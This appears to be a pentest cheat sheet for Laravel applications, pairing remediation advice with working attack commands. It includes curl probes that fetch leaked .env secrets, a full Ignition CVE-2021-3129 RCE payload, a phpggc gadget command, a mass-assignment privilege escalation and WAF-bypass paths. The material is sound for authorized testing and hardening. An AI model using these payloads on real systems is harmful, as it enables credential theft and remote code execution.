# Laravel

> PHP framework. Top paths: leaked `.env`, Telescope / Horizon / Ignition debug pages, deserialization via `APP_KEY` leak, route-based mass assignment, blade XSS. Authorized testing only.

## TL;DR
- Misconfigured Laravel apps that leak `.env` give attacker `APP_KEY` → cookie / session forgery, queue payload forgery, and (with Laravel 8.x Ignition CVE) RCE.
- Telescope (`/telescope`) and Horizon (`/horizon`) are dev / monitoring panels that frequently land on prod accidentally.
- Ignition's error page (CVE-2021-3129) allowed RCE via crafted JSON to `/_ignition/execute-solution`.
- Defence: never serve `.env`; `APP_DEBUG=false` in production; restrict Telescope / Horizon to admin auth + non-public network; framework + Ignition versions current.

## Detection / Discovery

### Fingerprint
```bash
# Most Laravel apps leave the X-Powered-By or laravel_session cookie name
curl -sI https://target/ | grep -iE 'powered-by|set-cookie' | head
# Look for: laravel_session, XSRF-TOKEN cookies

# Default 404 page on Laravel has 'Whoops, looks like something went wrong.' or 'NotFoundHttpException'
curl -s https://target/nonexistent-path-12345 | grep -iE 'laravel|whoops|symfony|larav'

# Public asset paths
curl -sI https://target/css/app.css                  # often vite/mix bundled assets
```

### Debug pages exposed
```bash
# .env exposure
for f in .env .env.example .env.local .env.production .env.bak '.env~' .env.dev; do
  curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target/$f"
done

# Telescope (dev tooling)
curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://target/telescope

# Horizon (queues)
curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://target/horizon

# Nova (admin) — paid Laravel admin panel; default path /nova
curl -sk -o /dev/null -w "%{http_code} %{url_effective}\n" https://target/nova/login

# Ignition error page (active with APP_DEBUG=true)
curl -sk "https://target/?abc=test" -H 'Cookie: invalid'   # often triggers Ignition error display

# Debug routes
curl -sk https://target/_ignition/health-check          # if exposed -> Ignition installed
```

## Exploitation

### `.env` leakage
```bash
curl -sk https://target/.env
# Sample contents:
#   APP_KEY=base64:abc123...
#   APP_DEBUG=true
#   DB_PASSWORD=Pa$$w0rd
#   MAIL_PASSWORD=...
#   AWS_ACCESS_KEY_ID=...
```
With `APP_KEY` (the 32-byte symmetric key Laravel uses for `encryptString()`, queue payload encryption, signed routes, and (pre-Laravel-9) cookie encryption):
- **Cookie forgery**: decrypt then re-encrypt the `laravel_session` cookie with any session ID.
- **Signed URL forgery**: `URL::signedRoute()` becomes attacker-controllable.
- **Queue payload forgery** (CVE-2018-15133, fixed in Laravel 5.6.30) → on vulnerable apps, deserialization of attacker-supplied queue payload → RCE via PHPGGC chain.

```bash
# Example with phpggc + Laravel encryption
phpggc Laravel/RCE9 system 'id' | base64        # CVE-2018-15133-style gadget
# Then encrypt with the leaked APP_KEY using a Laravel-encrypted-payload generator
```

### Ignition RCE (CVE-2021-3129)
Affects Laravel 8.x with `facade/ignition < 2.5.2`. Requires `APP_DEBUG=true`.
```bash
curl -sk -X POST https://target/_ignition/execute-solution \
  -H 'Content-Type: application/json' \
  -d '{
    "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters":{
      "variableName":"username",
      "viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.base64-decode/resource=/tmp/x.php"
    }
  }'
# Chain crafts a malicious PHP file at /tmp/x.php; subsequent include via LFI primitive yields RCE.
```
Full PoC: https://github.com/zhzyker/CVE-2021-3129

### Telescope / Horizon exposed
- Telescope dashboard exposes requests, queries, exceptions — request bodies often contain credentials.
- Horizon shows queue jobs incl. payload contents.
- Both default to "local environment only" but operators frequently misconfigure (`gate` callback returning `true` indiscriminately).

```bash
curl -sk https://target/telescope/requests | head -100
```

### Mass assignment / unguarded models
```php
// Vulnerable Controller:
User::create($request->all());

// Malicious POST:
// name=bob&email=bob@x.com&password=...&is_admin=1
```
If the User model doesn't have `protected $fillable = [...]` or `protected $guarded = ['is_admin']`, the attribute is set.

### Blade auto-escape bypass
Blade auto-escapes `{{ $var }}`. Developers sometimes use `{!! $var !!}` (raw) for legitimate reasons but pipe attacker input through it → stored XSS. Grep for `{!! ` in templates as a pentest finding.

### Route enumeration with `php artisan route:list`
Available if you reach the artisan CLI on a compromised host. From the outside, the routes are discoverable via fuzzing + the typical `routes/web.php` and `routes/api.php` patterns. `nuclei` has templates for Laravel.

### CSRF token bypass
Laravel's `VerifyCsrfToken` middleware can be excluded for specific routes (`$except` array). Routes added there are CSRF-able.

## Bypasses
- WAF blocks `/.env` → `/.env%00`, `/public/../.env`, `/storage/../.env`.
- Telescope behind auth — sometimes the `gate` check has a bug; impersonation cookies / SSO chain → admin access.
- `APP_KEY` rotation if .env leak detected — but old session cookies remain valid until expiry; rotate sessions too.

## Defence / Remediation
- **`.env` is never served**: web-server config (`nginx`: `location ~ /\. { deny all; }`) + `public/` is the only document root (Laravel default). Verify with explicit probe.
- **`APP_DEBUG=false` in production** + a real error-handler that doesn't leak stack traces. Ignition / Whoops only in `local` env.
- **Telescope / Horizon / Nova**:
  - `auth` middleware required.
  - `gate` callback restricting to specific IPs or admin users.
  - Don't deploy Telescope to production (`telescope:install --only-dev`, or `composer require --dev`).
- **`APP_KEY`** rotation if there's any chance of leak; new key invalidates all sessions / signed URLs.
- **Eloquent mass assignment**: `protected $fillable = [...]` allow-list every model. Never `Model::create($request->all())` on user-controllable input.
- **CSRF middleware**: don't whitelist routes from CSRF protection unless they're API-token-authed.
- **`composer audit`** in CI; subscribe to https://laravel-news.com/ security tag.
- **Patch cadence**: Laravel framework + Ignition + Tinker + popular packages (Sanctum, Passport) — track changelogs.
- **Encrypted cookies** (`'encrypted' => true` in `config/session.php`) — default. Combined with `APP_KEY` rotation discipline, neutralises cookie-forgery if key leaks but then rotates.

## Sources
- Laravel docs — Configuration: https://laravel.com/docs/configuration
- Laravel docs — Security: https://laravel.com/docs/authentication
- Ignition CVE-2021-3129 advisory: https://github.com/spatie/laravel-ignition/security/advisories
- CVE-2018-15133 (Laravel queue deserialization): https://github.com/laravel/framework/security
- HackTricks Laravel: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/laravel.html
- phpggc Laravel gadgets: https://github.com/ambionics/phpggc
- nuclei laravel templates: https://github.com/projectdiscovery/nuclei-templates (search laravel)
- Spatie Ignition: https://github.com/spatie/laravel-ignition
